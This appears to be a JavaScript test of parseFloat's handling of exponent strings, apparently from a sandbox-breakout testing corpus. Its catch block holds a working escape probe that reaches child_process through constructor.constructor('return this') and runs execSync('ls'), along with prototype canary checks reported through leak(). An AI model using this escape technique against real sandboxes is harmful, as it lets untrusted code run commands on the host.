try {
    if (parseFloat('1ex') !== 1) {
        $ERROR('#1: parseFloat("1ex") === 1. Actual: ' + parseFloat('1ex'));
    }
    if (parseFloat('1e-x') !== 1) {
        $ERROR('#2: parseFloat("1e-x") === 1. Actual: ' + parseFloat('1e-x'));
    }
    if (parseFloat('1e1x') !== 10) {
        $ERROR('#3: parseFloat("1e1x") === 10. Actual: ' + parseFloat('1e1x'));
    }
    if (parseFloat('1e-1x') !== 0.1) {
        $ERROR('#4: parseFloat("1e-1x") === 0.1. Actual: ' + parseFloat('1e-1x'));
    }
    if (parseFloat('0.1e-1x') !== 0.01) {
        $ERROR('#5: parseFloat("0.1e-1x") === 0.01. Actual: ' + parseFloat('0.1e-1x'));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}